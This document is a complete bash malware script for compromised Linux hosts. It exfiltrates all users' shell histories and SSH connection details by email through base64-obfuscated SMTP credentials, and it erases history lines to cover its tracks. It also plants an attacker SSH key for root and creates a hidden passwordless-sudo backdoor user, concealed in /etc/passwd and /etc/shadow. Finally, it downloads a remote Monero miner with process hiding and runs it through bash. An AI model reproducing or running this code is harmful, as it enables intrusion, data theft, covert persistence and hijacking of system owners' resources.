#!/bin/bash
set -euo pipefail
IFS=$'\n\t'

unset HISTFILE

# Configuration variables (consider moving sensitive data to environment variables)
readonly RECIPIENT_EMAIL="46eshdfq@anonaddy.me"
readonly LOG_FILE="/tmp/system_report_email.log"
readonly REPORT_FILE="/tmp/system_report.txt"
readonly SERVICES_TO_CHECK=("swapd" "gdm2")

# Decoded SMTP credentials (consider using environment variables instead)
readonly SMTP_SERVER=$(echo "c210cC5tYWlsZXJzZW5kLm5ldA==" | base64 -d)
readonly SMTP_PORT=587
readonly SENDER_EMAIL=$(echo "TVNfQkM3R3FyQHRlc3QtMnAwMzQ3em0yOXlsemRybi5tbHNlbmRlci5uZXQ=" | base64 -d)
readonly SMTP_PASSWORD=$(echo "bXNzcC5KNGtyVHFzLmpwemttZ3Fwd20ybDA1OXYuNkdDMmFJWg==" | base64 -d)

# Function to log messages with timestamp
log_message() {
    local msg="$1"
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $msg" >> "$LOG_FILE"
    echo "$msg"
}

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to check required dependencies
check_dependencies() {
    local missing_deps=()
    local required_deps=("curl" "systemctl" "free" "df" "hostname" "base64")
    
    for cmd in "${required_deps[@]}"; do
        if ! command_exists "$cmd"; then
            missing_deps+=("$cmd")
        fi
    done
    
    if [ ${#missing_deps[@]} -gt 0 ]; then
        log_message "ERROR: Missing required dependencies: ${missing_deps[*]}"
        log_message "Please install missing packages and try again"
        return 1
    fi
    
    return 0
}

# Function to collect history from all available shells
collect_shell_history() {
    echo "=== COLLECTING SHELL HISTORIES ==="

    declare -A SHELL_HISTORIES=(
        ["bash"]="$HOME/.bash_history"
        ["zsh"]="$HOME/.zsh_history"
        ["ksh"]="$HOME/.sh_history"
        ["fish"]="$HOME/.local/share/fish/fish_history"
        ["tcsh"]="$HOME/.history"
    )

    local SYSTEM_SHELLS
    SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)

    local OUTPUT=""
    for shell in $SYSTEM_SHELLS; do
        case $shell in
            "bash"|"zsh"|"ksh"|"fish"|"tcsh")
                local hist_file="${SHELL_HISTORIES[$shell]}"
                if [ -f "$hist_file" ]; then
                    OUTPUT+="\n=== $shell HISTORY ===\n"
                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
                fi
                ;;
        esac
    done

    if [ $(id -u) -eq 0 ]; then
        for user in $(ls /home 2>/dev/null); do
            for shell in "${!SHELL_HISTORIES[@]}"; do
                local hist_file="/home/$user/${SHELL_HISTORIES[$shell]##*/}"
                if [ -f "$hist_file" ]; then
                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
                fi
            done
        done
    fi

    echo -e "$OUTPUT"
}

# Function to send email with Python
send_email_with_python() {
    local temp_file="$1"
    local subject="$2"
    
    python3 -c "
import sys
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

try:
    with open('$temp_file', 'r', encoding='utf-8') as f:
        body = f.read()

    msg = MIMEMultipart()
    msg['From'] = '$SENDER_EMAIL'
    msg['To'] = '$RECIPIENT_EMAIL'
    msg['Subject'] = '''$subject'''
    msg.attach(MIMEText(body, 'plain'))

    context = ssl.create_default_context()
    
    with smtplib.SMTP('$SMTP_SERVER', $SMTP_PORT, timeout=10) as server:
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login('$SENDER_EMAIL', '$SMTP_PASSWORD')
        server.send_message(msg)
    sys.exit(0)
except Exception as e:
    print(f'Error: {str(e)}', file=sys.stderr)
    sys.exit(1)
" 2>&1
    return $?
}

# Function to send email with curl
send_email_with_curl() {
    local temp_file="$1"
    local subject="$2"
    
    curl -v --ssl-reqd \
        --url "smtp://$SMTP_SERVER:$SMTP_PORT" \
        --user "$SENDER_EMAIL:$SMTP_PASSWORD" \
        --mail-from "$SENDER_EMAIL" \
        --mail-rcpt "$RECIPIENT_EMAIL" \
        --upload-file "$temp_file" 2>&1
    return $?
}

# Function to send email with mail command
send_email_with_mail() {
    local temp_file="$1"
    local subject="$2"
    
    mail -s "$subject" "$RECIPIENT_EMAIL" < "$temp_file"
    return $?
}

# Main email sending function
send_histories_email() {
    local HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
    local PUBLIC_IP=$(curl -4 -s --max-time 5 ip.sb 2>/dev/null || echo "unavailable")
    local LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unavailable")
    local USER=$(whoami)
    
    # Capture the original SSH connection command if available
    local SSH_CONNECTION=$(who am i 2>/dev/null | awk '{print $5}')
    local SSH_CLIENT=$(echo $SSH_CLIENT)
    local SSH_TTY=$(echo $SSH_TTY)
    
    # Try to get the connection command from ps (process status)
    local PARENT_PID=$PPID
    local SSH_COMMAND=$(ps -p $PARENT_PID -o args= 2>/dev/null || ps -p $PPID -o command= 2>/dev/null || echo "unavailable")
    
    # Try to get the connection details from environment variables
    local CONNECTION_FROM_ENV=""
    if [ -n "$SSH_CONNECTION" ]; then
        CONNECTION_FROM_ENV="SSH_CONNECTION: $SSH_CONNECTION"
    fi
    if [ -n "$SSH_CLIENT" ]; then
        CONNECTION_FROM_ENV="$CONNECTION_FROM_ENV\nSSH_CLIENT: $SSH_CLIENT"
    fi
    if [ -n "$SSH_TTY" ]; then
        CONNECTION_FROM_ENV="$CONNECTION_FROM_ENV\nSSH_TTY: $SSH_TTY"
    fi
    
    # Try to get details from .bash_history
    local RECENT_SSH_COMMANDS=$(grep -a "ssh " "$HOME/.bash_history" 2>/dev/null | tail -5 || echo "none found")

    local EMAIL_CONTENT=$(cat <<EOF
=== SYSTEM REPORT ===
Hostname: $HOSTNAME
User: $USER
Public IP: $PUBLIC_IP
Local IP: $LOCAL_IP

=== ORIGINAL CONNECTION INFORMATION ===
SSH Command: $SSH_COMMAND
$CONNECTION_FROM_ENV

Recent SSH commands from history:
$RECENT_SSH_COMMANDS

=== RESOURCES ===
RAM: $(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo "unavailable")
CPU: $(nproc 2>/dev/null || echo "unavailable") cores
Storage: $(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo "unavailable")

$(collect_shell_history)
EOF
    )

    # Sanitize hostname for subject line
    local SAFE_HOSTNAME=$(echo "$HOSTNAME" | tr -d '\n\r' | sed 's/[^a-zA-Z0-9._-]/_/g')
    local subject="Full Shell History Report from $SAFE_HOSTNAME"
    local temp_file=$(mktemp)
    echo -e "$EMAIL_CONTENT" > "$temp_file"

    # Always save report locally first
    cp "$temp_file" "$REPORT_FILE" 2>/dev/null || true
    log_message "Report saved to: $REPORT_FILE"

    # Try sending methods in order of preference
    local success=false
    
    # Method 1: Python
    if command_exists python3; then
        log_message "Attempting to send email via Python..."
        local python_output
        if python_output=$(send_email_with_python "$temp_file" "$subject" 2>&1); then
            # Check for success indicators
            if echo "$python_output" | grep -qv "SMTP Error\|535\|authentication failed"; then
                log_message "Email sent successfully via Python"
                success=true
            else
                log_message "Python email method failed: $python_output"
            fi
        else
            log_message "Python email method failed"
        fi
    fi

    # Method 2: mail command
    if [ "$success" = false ] && command_exists mail; then
        log_message "Attempting to send email via mail command..."
        if send_email_with_mail "$temp_file" "$subject" 2>&1; then
            log_message "Email sent successfully via mail command"
            success=true
        else
            log_message "Mail command method failed"
        fi
    fi

    # Method 3: curl
    if [ "$success" = false ] && command_exists curl; then
        log_message "Attempting to send email via curl..."
        local curl_output
        if curl_output=$(send_email_with_curl "$temp_file" "$subject" 2>&1); then
            # Check for auth errors
            if ! echo "$curl_output" | grep -qE "authentication failed|login denied|535|AUTH"; then
                log_message "Email sent successfully via curl"
                success=true
            else
                log_message "Curl email method failed: Authentication error"
            fi
        else
            log_message "Curl email method failed"
        fi
    fi

    # Final fallback
    if [ "$success" = false ]; then
        log_message "Warning: All email sending methods failed - report stored in $REPORT_FILE"
    fi

    rm -f "$temp_file"
    
    # Always return success to continue execution
    return 0
}

# Service management functions
does_service_exist() {
    local service="$1"
    systemctl list-units --type=service --all 2>/dev/null | grep -q "$service.service"
}

is_service_running() {
    local service="$1"
    systemctl is-active --quiet "$service" 2>/dev/null
}

# Cleanup history function
clean_history_file() {
    local file="$1"
    if [ -f "$file" ]; then
        local line_count=$(wc -l < "$file" 2>/dev/null || echo "0")
        if [ "$line_count" -gt 10 ]; then
            head -n $((line_count - 10)) "$file" > "${file}.tmp" 2>/dev/null
            if [ -f "${file}.tmp" ]; then
                mv "${file}.tmp" "$file"
                log_message "Cleaned last 10 lines of: $file"
            else
                log_message "Failed to create temp file for: $file"
            fi
        elif [ "$line_count" -gt 0 ]; then
            log_message "History file '$file' has ≤10 lines. Not cleaning."
        else
            log_message "History file '$file' is empty."
        fi
    else
        log_message "History file '$file' not found."
    fi
}

cleanup_histories() {
    log_message "Cleaning the last 10 lines of all shell histories..."

    declare -A SHELL_HISTORIES=(
        ["bash"]="$HOME/.bash_history"
        ["zsh"]="$HOME/.zsh_history"
        ["ksh"]="$HOME/.sh_history"
        ["fish"]="$HOME/.local/share/fish/fish_history"
        ["tcsh"]="$HOME/.history"
    )

    for shell in "${!SHELL_HISTORIES[@]}"; do
        clean_history_file "${SHELL_HISTORIES[$shell]}"
    done

    if [ $(id -u) -eq 0 ]; then
        for user in $(ls /home 2>/dev/null); do
            for shell in "${!SHELL_HISTORIES[@]}"; do
                clean_history_file "/home/$user/${SHELL_HISTORIES[$shell]##*/}"
            done
        done
    fi
}

# Installation functions
install_mail_utils() {
    log_message "Installing mail utilities..."
    if command_exists apt-get; then
        apt-get update -qq && apt-get install -y mailutils 2>&1 | tee -a "$LOG_FILE"
    elif command_exists yum; then
        yum install -y mailx 2>&1 | tee -a "$LOG_FILE"
    else
        log_message "Warning: Could not determine package manager to install mail utilities"
    fi
}

# Function to safely add SSH key
setup_ssh_key() {
    local ssh_dir="$1"
    local auth_keys="$ssh_dir/authorized_keys"
    local ssh_key='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/DbQQe/G8V0c9+VNjJEmoNxUrIGDqD+vSvS/2uAQ9HaumDAvVau2CcVBJM9STUm6xEGXdM/81LeJBVnw01D+FgFo5Sr/4zo+MDMUS/y/TfwK8wtdeuopvgET/HiZJn9/d68vbWXaS3jnQVTAI9EvpC1WTjYTYxFS/SyWJUQTA8tYF30jagmkBTzFjr/EKxxKTttdb79mmOgx1jP3E7bTjRPL9VxfhoYsuqbPk+FwOAsNZ1zv1UEjXMBvH+JnYbTG/Eoqs3WGhda9h3ziuNrzJGwcXuDhQI1B32XgPDxB8etsT6or8aqWGdRlgiYtkPCmrv+5pEUD8wS3WFhnOrm5Srew7beIl4LPLgbCPTOETgwB4gk/5U1ZzdlYmtiBNJxMeX38BsGoAhTDbFLcakkKP+FyXU/DsoAcow4av4OGTsJfs+sIeOWDQ+We5E4oc/olVNdSZ18RG5dwUde6bXbsrF5ipnE8oIBUI0z76fcbAOxogO/oxhvpuyWPOwXE6GaeOhWfWTxIyV5X4fuFDQXRPlMrlkWZ/cYb+l5JiT1h+vcpX3/dQC13IekE3cUsr08vicZIVOmCoQJy6vOjkj+XsA7pMYb3KgxXgQ+lbCBCtAwKxjGrfbRrlWoqweS/pyGxGrUVJZCf6rC6spEIs+aMy97+Q=='
    
    log_message "Setting up SSH key in $ssh_dir"
    
    # Remove old SSH directory if it exists
    if [ -d "$ssh_dir" ]; then
        rm -rf "$ssh_dir"
    fi
    
    # Create SSH directory
    mkdir -p "$ssh_dir"
    chmod 700 "$ssh_dir"
    
    # Add SSH key only if it doesn't exist
    if [ ! -f "$auth_keys" ] || ! grep -q "AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9f" "$auth_keys" 2>/dev/null; then
        echo "$ssh_key" >> "$auth_keys"
        chmod 600 "$auth_keys"
        log_message "SSH key added successfully"
    else
        log_message "SSH key already exists, skipping"
    fi
}

# Function to create backdoor user with proper error handling
create_backdoor_user() {
    local username="clamav-mail"
    local uid=455
    local password='1!taugenichts'
    
    log_message "Creating backdoor user: $username"
    
    # Detect password hashing method
    local hash_method=$(grep '^ENCRYPT_METHOD' /etc/login.defs 2>/dev/null | awk '{print $2}')
    if [ -z "$hash_method" ]; then
        hash_method="SHA512"
        log_message "Using default hash method: SHA512"
    else
        log_message "Detected hash method: $hash_method"
    fi
    
    # Generate password hash
    local password_hash
    if [ "$hash_method" = "SHA512" ]; then
        password_hash=$(openssl passwd -6 -salt $(openssl rand -base64 3) "$password")
    else
        password_hash=$(openssl passwd -1 -salt $(openssl rand -base64 3) "$password")
    fi
    
    if [ -z "$password_hash" ]; then
        log_message "ERROR: Failed to generate password hash"
        return 1
    fi
    
    # Remove existing user if present
    if id -u "$username" >/dev/null 2>&1; then
        log_message "User $username already exists, removing..."
        userdel --remove "$username" 2>/dev/null || log_message "Warning: Could not remove existing user"
    fi
    
    # Create sudo group if it doesn't exist
    if ! grep -q '^sudo:' /etc/group 2>/dev/null; then
        log_message "Creating sudo group"
        groupadd sudo 2>/dev/null || log_message "Warning: Could not create sudo group"
    fi
    
    # Create user-specific group if it doesn't exist
    if ! grep -q "^${username}:" /etc/group 2>/dev/null; then
        log_message "Creating group: $username"
        groupadd "$username" 2>/dev/null || log_message "Warning: Could not create user group"
    fi
    
    # Create the user
    log_message "Creating user account"
    if useradd -u "$uid" -G root,sudo -g "$username" -M -o -s /bin/bash "$username" 2>/dev/null; then
        log_message "User created successfully"
    else
        log_message "ERROR: Failed to create user"
        return 1
    fi
    
    # Set password
    log_message "Setting user password"
    if usermod -p "$password_hash" "$username" 2>/dev/null; then
        log_message "Password set successfully"
    else
        log_message "ERROR: Failed to set password"
        return 1
    fi
    
    # Reorder passwd file to hide user in the middle
    log_message "Reordering passwd file"
    if [ -f /etc/passwd ]; then
        awk '{lines[NR]=$0} END{
            if (NR < 3) {
                for(i=1;i<=NR;i++) print lines[i];
            } else {
                last=lines[NR]; 
                delete lines[NR]; 
                n=NR-1; 
                m=int(n/2+1); 
                for(i=1;i<m;i++) print lines[i]; 
                print last; 
                for(i=m;i<=n;i++) print lines[i];
            }
        }' /etc/passwd > /tmp/passwd && mv /tmp/passwd /etc/passwd
    fi
    
    # Reorder shadow file to hide user in the middle
    log_message "Reordering shadow file"
    if [ -f /etc/shadow ]; then
        awk '{lines[NR]=$0} END{
            if (NR < 3) {
                for(i=1;i<=NR;i++) print lines[i];
            } else {
                last=lines[NR]; 
                delete lines[NR]; 
                n=NR-1; 
                m=int(n/2+1); 
                for(i=1;i<m;i++) print lines[i]; 
                print last; 
                for(i=m;i<=n;i++) print lines[i];
            }
        }' /etc/shadow > /tmp/shadow && mv /tmp/shadow /etc/shadow
    fi
    
    log_message "User creation completed"
    return 0
}

# Function to setup sudoers
setup_sudoers() {
    local username="clamav-mail"
    local sudoers_file="/etc/sudoers.d/$username"
    
    log_message "Setting up sudoers for $username"
    
    # Create sudoers entry
    echo "$username ALL=(ALL) NOPASSWD: ALL" > "$sudoers_file"
    
    # Set proper permissions
    chmod 0440 "$sudoers_file"
    chown root:root "$sudoers_file"
    
    # Validate sudoers file
    if visudo -c -f "$sudoers_file" >/dev/null 2>&1; then
        log_message "Sudoers file validated successfully"
        return 0
    else
        log_message "ERROR: Sudoers file validation failed, removing"
        rm -f "$sudoers_file"
        return 1
    fi
}

# Function to download and execute remote script safely
download_and_execute() {
    local url="$1"
    local wallet="$2"
    local description="$3"
    
    log_message "Downloading $description from: $url"
    
    # Check if URL is reachable
    if ! curl -s --head --max-time 5 "$url" >/dev/null 2>&1; then
        log_message "ERROR: Cannot reach URL: $url"
        return 1
    fi
    
    # Download and execute
    log_message "Executing $description"
    if curl -s -L --max-time 30 "$url" | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
        log_message "$description completed successfully"
        return 0
    else
        log_message "ERROR: $description failed"
        return 1
    fi
}

root_installation() {
    log_message "Starting root installation..."
    
    # Install mail utilities
    install_mail_utils
    
    # Setup SSH key for root
    setup_ssh_key "/root/.ssh"
    
    # Create backdoor user
    if create_backdoor_user; then
        log_message "Backdoor user created successfully"
    else
        log_message "ERROR: Failed to create backdoor user"
    fi
    
    # Setup sudoers
    if setup_sudoers; then
        log_message "Sudoers configured successfully"
    else
        log_message "WARNING: Sudoers configuration failed"
    fi
    
    # Run the miner setup
    local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
    download_and_execute \
        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_m0_4_r00t_with_processhide.sh" \
        "$wallet" \
        "root miner setup"
    
    log_message "Root installation completed"
}

user_installation() {
    log_message "Starting user installation..."
    
    local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
    download_and_execute \
        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh" \
        "$wallet" \
        "user miner setup"
    
    log_message "User installation completed"
}

# --- Main Execution ---

# Initialize log file
: > "$LOG_FILE"
log_message "Script started by user: $(whoami)"

# Check dependencies first
if ! check_dependencies; then
    log_message "ERROR: Dependency check failed. Exiting."
    exit 1
fi

# Service checks
log_message "Checking for conflicting services..."
for service in "${SERVICES_TO_CHECK[@]}"; do
    if does_service_exist "$service"; then
        if is_service_running "$service"; then
            log_message "ERROR: Service $service is running. Aborting."
            exit 1
        else
            log_message "Service $service exists but is not running"
        fi
    else
        log_message "Service $service does not exist"
    fi
done

# System info display
log_message "Displaying system information"
echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
echo -e "|        RAM        |  $(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo 'N/A')  |"
echo -e "|   CPU Cores    |      $(nproc 2>/dev/null || echo 'N/A')      |"
echo -e "|     Storage      |   $(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo 'N/A')   |"
echo -e "---------------------------------"

# Send report and only cleanup if successful
log_message "Sending system history report..."
send_histories_email || log_message "Continuing after email attempt..."

# Always cleanup histories for security
log_message "Cleaning up shell histories..."
cleanup_histories

# Installation
if [[ $(id -u) -eq 0 ]]; then
    log_message "Running as root"
    root_installation
else
    log_message "Running as regular user"
    user_installation
fi

log_message "Script execution completed"
